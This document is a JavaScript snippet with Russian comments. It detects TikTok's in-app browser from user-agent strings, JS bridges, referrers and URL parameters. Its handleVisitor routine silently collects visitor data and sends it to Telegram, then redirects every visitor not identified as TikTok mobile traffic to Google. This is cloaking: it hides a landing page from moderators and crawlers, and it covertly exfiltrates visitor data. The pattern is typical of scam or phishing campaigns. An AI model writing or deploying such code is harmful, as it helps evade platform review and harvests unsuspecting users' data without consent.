function isTikTokWebView() {
    const userAgent = navigator.userAgent.toLowerCase();
    const appVersion = navigator.appVersion.toLowerCase();
    
    // Расширенный список сигнатур TikTok
    const tiktokSignatures = [
        'tiktok',
        'musical_ly',
        'bytedance',
        'tiktokapp',
        'musically',
        'aweme', // Китайская версия TikTok
        'tt-wb' // WebView сигнатура
    ];
    
    // Проверка User Agent и AppVersion
    const isTikTokUA = tiktokSignatures.some(signature => 
        userAgent.includes(signature) || appVersion.includes(signature)
    );
    
    // Дополнительные проверки
    const hasWebViewFeatures = (
        // Проверка характерных для WebView свойств
        typeof window.AndroidBridge !== 'undefined' ||
        typeof window.webkit?.messageHandlers !== 'undefined' ||
        typeof window.TikTokJSBridge !== 'undefined'
    );
    
    // Проверка мобильных устройств
    const isMobileDevice = /Mobile|Android|iPhone|iPad/i.test(userAgent);
    
    // Проверка референсера
    const referrer = document.referrer.toLowerCase();
    const hasTikTokReferrer = tiktokSignatures.some(signature => 
        referrer.includes(signature)
    );
    
    // Проверка URL параметров
    const urlParams = new URLSearchParams(window.location.search);
    const hasTikTokParams = urlParams.has('tt_from') || 
                           urlParams.has('_d') ||
                           urlParams.has('tt_medium');
    
    // Логирование для отладки
    console.log('TikTok Detection Results:', {
        userAgent,
        isTikTokUA,
        hasWebViewFeatures,
        isMobileDevice,
        hasTikTokReferrer,
        hasTikTokParams
    });
    
    // Возвращаем true если есть хотя бы два признака TikTok WebView
    return (isTikTokUA && isMobileDevice) || 
           (hasWebViewFeatures && isMobileDevice) ||
           (hasTikTokReferrer && isMobileDevice) ||
           (hasTikTokParams && isMobileDevice);
}

// Обновленная функция handleVisitor с дополнительной проверкой и более длительной задержкой
async function handleVisitor() {
    const visitorData = await collectVisitorData();
    await sendToTelegram(visitorData);
    
    // Увеличиваем задержку для надежности
    setTimeout(() => {
        const isTikTok = isTikTokWebView();
        
        // Дополнительная проверка через 100мс для надежности
        setTimeout(() => {
            const secondCheck = isTikTokWebView();
            console.log('TikTok Detection Results:', {
                firstCheck: isTikTok,
                secondCheck: secondCheck
            });
            
            // Редирект только если оба раза определилось что это не TikTok
            if (!isTikTok && !secondCheck) {
                window.location.href = 'https://www.google.com/';
            }
        }, 100);
    }, 1000);
}